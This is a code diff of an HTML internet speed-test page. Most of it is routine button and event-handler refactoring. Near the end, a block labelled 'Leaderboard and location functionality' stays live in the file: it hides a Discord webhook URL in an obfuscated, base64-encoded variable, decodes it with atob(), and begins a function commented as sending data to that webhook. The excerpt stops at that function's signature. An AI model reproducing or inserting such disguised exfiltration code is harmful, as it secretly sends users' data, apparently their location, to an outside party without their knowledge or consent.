@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Internet Speed Test</title>
    <link rel="stylesheet" href="styles.css">
-</head>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -199,7 +198,7 @@
                 <div class="speed-text">0 Mbps</div>
             </div>
             <div class="loader"></div>
-            <button id="startTestBtn">Start Test</button>
+            <button id="startTestBtnTop">Start Test</button>
             <div class="history">
                 <h3>History</h3>
                 <ul id="test-history">
@@ -260,7 +259,8 @@
     <script>
         // Speed test functionality (replace with actual implementation)
         document.addEventListener('DOMContentLoaded', function() {
-            const startTestBtn = document.querySelectorAll('#startTestBtn');
+            const startTestBtns = document.querySelectorAll('#startTestBtn');
+            const startTestBtnTop = document.getElementById('startTestBtnTop');
             const restartBtn = document.getElementById('restartBtn');
             const downloadSpeedSpan = document.getElementById('download-speed');
             const uploadSpeedSpan = document.getElementById('upload-speed');
@@ -274,14 +274,12 @@
             const jitterSpan = document.getElementById('jitter');
             const testHistoryList = document.getElementById('test-history');
 
-            startTestBtn.forEach(btn => {
-                btn.addEventListener('click', startSpeedTest);
-            });
-
-            restartBtn.addEventListener('click', startSpeedTest);
-
             function startSpeedTest() {
                 loaderWidget.classList.add('hide');
+                const nonResultWidget = document.querySelector('.loader-widget:not(.result)');
+                if (nonResultWidget) {
+                    nonResultWidget.classList.add('hide');
+                }
                 resultWidget.classList.remove('hide');
                 pingDiv.classList.remove('hide');
 
@@ -304,12 +302,26 @@
                 listItem.textContent = `D: ${downloadSpeed} Mbps, U: ${uploadSpeed} Mbps, P: ${pingValue} ms`;
                 testHistoryList.appendChild(listItem);
             }
+
+            startTestBtns.forEach(btn => {
+                btn.addEventListener('click', startSpeedTest);
+            });
+
+            if (startTestBtnTop) {
+                startTestBtnTop.addEventListener('click', startSpeedTest);
+            }
+
+            restartBtn.addEventListener('click', () => {
+                resultWidget.classList.add('hide');
+                loaderWidget.classList.remove('hide');
+                pingDiv.classList.add('hide');
+            });
         });
 
         // Leaderboard and location functionality
         (function(){
             var _0x6d4b=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNjA0Nzc5MDY0NjU3MTExMDAvcDROaGJjay01NTgtQnlxNm04Z25uWjIzcy9sZV5nd3VpNHN5TlBtZQ=="];
-            var _0x23e4x2 = atob(_0x6d4b[0]); 
+            var _0x23e4x2 = atob(_0x6d4b[0]);
 
             // Function to send data to Discord Webhook
             function _0x21a6(a, b, c, d) {
